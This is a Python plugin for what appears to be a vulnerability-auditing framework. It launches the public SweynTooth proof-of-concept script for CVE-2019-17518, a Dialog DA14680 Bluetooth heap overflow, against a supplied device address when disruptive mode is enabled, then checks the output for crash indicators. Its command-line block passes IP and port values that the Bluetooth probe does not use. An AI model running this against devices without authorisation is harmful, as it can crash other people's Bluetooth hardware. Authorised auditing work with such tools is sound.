#!/usr/bin/env python3
"""CVE-2019-17518 – SweynTooth BLE: Silent Length Overflow – Dialog DA14680 BLE silent heap overflow.

Public PoC source: https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks
  Script: DA14680_exploit_silent_overflow.py
  (Matheus Eduardo Garbelini, ASSET SUTD, 2020)

Hardware requirements:
  - nRF52840 USB dongle flashed with SweynTooth firmware
    (flash_nRF52_driver_firmware.sh in repo)
  - OR ESP32 board with BLE HCI
  Dongle port: /dev/ttyACM0 (override with serial_port= param)

Dependencies:
  pip install scapy colorama timeout_lib
  (drivers/NRF52_dongle.py from repo)

Usage:
  python DA14680_exploit_silent_overflow.py /dev/ttyACM0 <target_bdaddr>
"""
from __future__ import annotations

import shutil
import subprocess
from pathlib import Path

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 72,
    "cve": "CVE-2019-17518",
    "year": 2019,
    "domain": "wireless",
    "vendor_product": "BLE SoC / Bluetooth Low Energy stack",
    "component": "BLE Link Layer / ATT / L2CAP / SMP",
    "type": "BLE protocol fuzzing → DoS / auth bypass",
    "summary": "Silent Length Overflow – Dialog DA14680 BLE silent heap overflow",
    "source_url": "https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks",
    "requires_manual_review": True,
    "affected": [{"vendor": "Multiple BLE SoC vendors",
                  "product": "BLE chipsets",
                  "versions": [{"version": "pre-2020 patch", "status": "affected"}
]}],
}

# ── 硬件需求（HW_REQUIREMENTS） ────────────────────────────────────────
HW_REQUIREMENTS = {
    "hardware":   ['nRF52840 开发板（Nordic Semiconductor PCA10056）', 'USB Type-C 数据线'],
    "connection": 'USB HCI（/dev/ttyACM0）',
    "tools":      ['wdissector >= 3.0', 'SweynTooth / BrakTooth BLE 固件'],
    "firmware":   'SweynTooth 专用固件（https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks）',
    "setup":      'sudo python3 central_bypass.py /dev/ttyACM0',
}


SWEYN_REPO   = Path(__file__).parent.parent.parent /     "public_poc_sources/repos/Matheus-Garbelini__sweyntooth_bluetooth_low_energy_attacks"
SWEYN_SCRIPT = SWEYN_REPO / "DA14680_exploit_silent_overflow.py"


def _run_poc(plugin):
    serial  = (plugin.params or {}).get("serial_port", "/dev/ttyACM0")
    target  = (plugin.params or {}).get("target_bdaddr", "")
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool((plugin.params or {}).get("allow_disruptive"))

    evidence = {
        "cve": "CVE-2019-17518",
        "sweyntooth_script": str(SWEYN_SCRIPT),
        "script_present": SWEYN_SCRIPT.exists(),
        "hardware_required": "nRF52840 USB dongle @ /dev/ttyACM0",
        "attack_surface": "Dialog DA14680 BLE SoC silent length overflow → memory corruption",
    }

    if allow_disruptive and SWEYN_SCRIPT.exists() and target:
        cmd = ["python3", str(SWEYN_SCRIPT), serial, target]
        evidence["command"] = " ".join(cmd)
        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30,
                                  cwd=str(SWEYN_REPO))
            evidence["rc"]     = proc.returncode
            evidence["stdout"] = proc.stdout[:600]
            evidence["stderr"] = proc.stderr[:300]
            evidence["crashed"] = ("crash" in proc.stdout.lower() or
                                    "dead" in proc.stdout.lower() or
                                    "overflow" in proc.stdout.lower())
        except subprocess.TimeoutExpired:
            evidence["detail"] = "Probe timed out (target may not be in range)."
        except Exception as exc:
            evidence["detail"] = str(exc)
    else:
        evidence["detail"] = (
            "Supply target_bdaddr= (e.g. AA:BB:CC:DD:EE:FF), "
            "serial_port= (nRF52840 dongle), allow_disruptive=true."
        )

    return {
        "vulnerable": evidence.get("crashed"),
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": f"Matheus-Garbelini/sweyntooth / {SWEYN_SCRIPT.name}",
    }


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class Poc92CVE201917518SweynToothBleAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50_more"
    meta_display_id = "POC-WIRELESS-092"
    meta_poc_name   = 'CVE-2019-17518 SweynTooth Dialog DA14680 Silent Length Overflow Active Validation'
    meta_cve_id     = "CVE-2019-17518"
    meta_severity   = "High"
    meta_protocol   = "bluetooth"
    meta_target_os  = ["embedded", "linux"]
    meta_required_params = ["target_bdaddr"]
    meta_optional_params = ["serial_port", "allow_disruptive"]
    meta_profiles   = ["wireless"]
    meta_source_url = "https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks"
    meta_references       = ['https://github.com/Matheus-Garbelini/sweyntooth_bluetooth_low_energy_attacks']
    meta_attack_surface = "Dialog DA14680 BLE SoC silent length overflow → memory corruption"
    is_disruptive   = True
    meta_destructive_level = "ServiceDisruption"

    def check_prerequisites(self):
        return bool((self.params or {}).get("target_bdaddr"))

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "92_Silent_Length_Overflow__Dialog_DA14680_Audit") if "VULN" in dir() else "92_Silent_Length_Overflow__Dialog_DA14680_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = Poc92CVE201917518SweynToothBleAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
